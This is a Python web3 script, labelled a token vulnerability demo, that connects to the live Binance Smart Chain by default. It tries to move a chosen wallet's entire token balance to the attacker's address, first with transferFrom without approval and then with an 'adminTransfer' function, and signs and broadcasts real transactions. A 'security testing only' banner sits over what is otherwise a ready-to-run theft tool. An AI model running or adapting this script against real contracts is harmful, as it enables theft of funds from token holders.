from web3 import Web3
import argparse
import getpass
from web3.middleware import geth_poa_middleware

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Token Vulnerability Demo')
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/", help='BSC RPC endpoint')
    parser.add_argument('--token', required=True, help='Token contract address')
    parser.add_argument('--from-address', required=True, help='Source wallet address')
    parser.add_argument('--to-address', required=True, help='Destination wallet address')
    args = parser.parse_args()

    # Initialize Web3 with POA middleware for BSC
    w3 = Web3(Web3.HTTPProvider(args.rpc))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    if not w3.isConnected():
        print("Failed to connect to blockchain")
        return

    # Vulnerable Token ABI (simplified)
    token_abi = [
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"adminTransfer","outputs":[],"type":"function"}  # Vulnerable function
    ]

    token = w3.eth.contract(address=args.token, abi=token_abi)

    # Securely get private key
    private_key = getpass.getpass("Enter your private key (must control to-address): ")
    account = w3.eth.account.from_key(private_key)
    
    if account.address.lower() != args.to_address.lower():
        print("Error: Private key doesn't match destination address")
        return

    try:
        # Check balances before
        print("\n[Initial Balances]")
        from_balance = token.functions.balanceOf(args.from_address).call()
        to_balance = token.functions.balanceOf(args.to_address).call()
        print(f"From Address: {from_balance / 10**8} BULL")
        print(f"To Address: {to_balance / 10**8} BULL")

        # Method 1: Using transferFrom without approval (if vulnerable)
        print("\n[Attempting transferFrom without approval]")
        try:
            tx = token.functions.transferFrom(
                args.from_address,
                args.to_address,
                from_balance
            ).build_transaction({
                'from': args.to_address,
                'gas': 200000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(args.to_address)
            })
            
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            print(f"✓ Success! TX Hash: {tx_hash.hex()}")
        except Exception as e:
            print(f"transferFrom failed (expected if fixed): {str(e)}")

        # Method 2: Using adminTransfer if exists
        print("\n[Attempting adminTransfer]")
        try:
            tx = token.functions.adminTransfer(
                args.from_address,
                args.to_address,
                from_balance
            ).build_transaction({
                'from': args.to_address,
                'gas': 200000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(args.to_address)
            })
            
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            print(f"✓ Success! TX Hash: {tx_hash.hex()}")
        except Exception as e:
            print(f"adminTransfer failed: {str(e)}")

        # Verify balances after
        print("\n[Final Balances]")
        print(f"From Address: {token.functions.balanceOf(args.from_address).call() / 10**8} BULL")
        print(f"To Address: {token.functions.balanceOf(args.to_address).call() / 10**8} BULL")

    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    print("""
    ***************************************
    * Token Vulnerability Demonstration   *
    * For Security Testing Purposes Only  *
    ***************************************
    """)
    main()
